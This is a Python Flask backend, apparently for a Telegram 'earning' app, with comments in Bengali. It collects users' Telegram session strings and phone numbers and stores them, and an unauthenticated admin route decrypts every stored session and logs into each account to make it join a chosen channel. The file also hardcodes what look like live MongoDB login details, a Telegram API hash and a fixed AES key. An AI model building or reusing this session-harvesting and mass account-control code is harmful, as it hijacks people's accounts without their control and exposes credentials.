import os
import base64
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

app = Flask(__name__)
CORS(app)

# --- কনফিগারেশন (আপনার সঠিক ডাটাগুলো বসানো হয়েছে) ---
API_ID = 36466824      # আপনার নতুন API ID
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  # আপনার নতুন API HASH
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # সেশন সুরক্ষিত রাখার কি (এটি পরিবর্তন করবেন না)

# ডাটাবেস কানেকশন
try:
    client_db = MongoClient(MONGO_URI)
    db = client_db['AAF_TeleEarn']
    users_col = db['users']
    sessions_col = db['sessions']
    print("✅ Server connected to MongoDB!")
except Exception as e:
    print(f"❌ MongoDB Error: {e}")

# --- এনক্রিপশন লজিক ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    iv_b64, ct_b64 = encrypted_str.split(':')
    iv = base64.b64decode(iv_b64)
    ct = base64.b64decode(ct_b64)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')

# --- ১. সেশন সেভ করা (ইউজার যখন অ্যাকাউন্ট অ্যাড করবে) ---
@app.route('/api/add_account', methods=['POST'])
def add_account():
    data = request.json
    uid = data.get('telegram_id')
    raw_session = data.get('session_string') 
    phone = data.get('phone')

    if not raw_session or not uid:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    encrypted = encrypt_session(raw_session)
    
    sessions_col.update_one(
        {"phone": phone},
        {"$set": {"telegram_id": int(uid), "session": encrypted, "status": "Active"}},
        upsert=True
    )
    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
    
    return jsonify({"status": "success", "message": "Account linked to server!"})

# --- ২. অ্যাডমিন কন্ট্রোল লজিক ---
@app.route('/api/admin/force_join', methods=['POST'])
async def force_join():
    data = request.json
    channel_to_join = data.get('channel', '@aaf_tele_earn') 

    all_sessions = sessions_col.find({"status": "Active"})
    count = 0

    for sess in all_sessions:
        try:
            string_session = decrypt_session(sess['session'])
            async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                await client(functions.channels.JoinChannelRequest(channel=channel_to_join))
                count += 1
        except Exception as e:
            print(f"Error controlling account {sess['phone']}: {e}")

    return jsonify({"status": "success", "joined_accounts": count})

# --- ৩. ড্যাশবোর্ড ডাটা (লগইন এবং ব্যালেন্স সিঙ্ক) ---
@app.route('/api/user_data_login', methods=['POST'])
def user_login():
    data = request.json
    uid = data.get('telegram_id')
    name = data.get('name')
    
    # নতুন ইউজার হলে ডাটাবেসে তৈরি করবে, পুরনো হলে আপডেট করবে
    users_col.update_one(
        {"telegram_id": int(uid)},
        {"$set": {"name": name, "status": "Active"}},
        upsert=True
    )
    return jsonify({"status": "success", "message": "Account linked to server!"})

@app.route('/api/user_data/<telegram_id>', methods=['GET'])
def get_user_data(telegram_id):
    try:
        user = users_col.find_one({"telegram_id": int(telegram_id)})
        if user:
            return jsonify({
                "status": "success",
                "name": user.get("name", "User"),
                "main_balance": user.get("main_balance", 0.0),
                "task_balance": user.get("task_balance", 0.0),
                "trade_balance": user.get("trade_balance", 0.0),
                "acc_balance": user.get("acc_balance", 0.0),
                "acc_status": user.get("status", "Inactive"),
                "added_accounts": user.get("added_accounts", 0)
            })
    except:
        pass
    return jsonify({"status": "error", "message": "User not found"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
